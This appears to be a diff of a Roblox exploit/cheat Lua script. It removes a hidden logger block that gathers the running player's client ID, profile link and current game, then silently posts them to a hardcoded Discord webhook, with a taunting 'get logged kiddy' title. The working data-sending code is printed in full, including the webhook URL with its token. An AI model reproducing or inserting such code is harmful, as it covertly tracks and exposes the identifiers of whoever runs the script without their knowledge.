@@ -735,55 +735,6 @@ coroutine.wrap(CJZEISY_fake_script)()
 
 
 
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
-local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.UserId .. '/profile'
-local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-
-local Webhook = 'https://discord.com/api/webhooks/1092296191238213652/cFLYw7lF65N8iym6zh4_Qg886JKt9UikVUrvONmSZDZopaxGOY29OobsLGSv6VLbXWbU'
-pcall(function()
-local data = {
-["embeds"] = {
-{
-["title"] = 'get logged kiddy: ' .. hwid,
-["description"] = 'Profile link: ' .. profilelink ..  ' ' .. 'Game link: ' .. gamelink,
-}
-}
-}
-if syn then
-local response = syn.request(
-{
-Url = Webhook,
-Method = 'POST',
-Headers = {
-['Content-Type'] = 'application/json'
-},
-Body = game:GetService('HttpService'):JSONEncode(data)
-}
-);
-elseif request then
-local response = request(
-{
-Url = Webhook,
-Method = 'POST',
-Headers = {
-['Content-Type'] = 'application/json'
-},
-Body = game:GetService('HttpService'):JSONEncode(data)
-}
-);
-elseif http_request then
-local response = http_request(
-{
-Url = Webhook,
-Method = 'POST',
-Headers = {
-['Content-Type'] = 'application/json'
-},
-Body = game:GetService('HttpService'):JSONEncode(data)
-}
-);
-end
-end)
 
 
 
